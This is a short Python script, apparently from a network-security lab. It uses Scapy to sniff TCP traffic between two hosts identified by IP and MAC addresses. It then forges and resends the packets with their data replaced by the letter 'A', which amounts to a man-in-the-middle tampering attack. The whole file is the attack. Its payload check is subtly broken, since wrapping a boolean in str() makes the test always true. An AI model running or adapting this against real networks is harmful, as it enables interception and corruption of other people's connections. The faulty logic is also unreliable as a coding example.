from scapy.all import *

def spoof_pkt(pkt):
	if pkt[IP].src=="10.0.2.4" and pkt[IP].dst=="10.0.2.5":
		IPLayer = IP(src=pkt[IP].src, dst=pkt[IP].dst)
		TCPLayer = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
			flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack,)
		if str(pkt[TCP].payload.isalpha()):
			Data = 'A'
			newpkt = IPLayer/TCPLayer/Data
		else:
			newpkt=pkt[IP]
		send(newpkt, verbose = 0)

pkt = sniff(filter='tcp and (ether src 08:00:27:29:b9:da or ether src 08:00:27:50:03:0d)', prn = spoof_pkt)
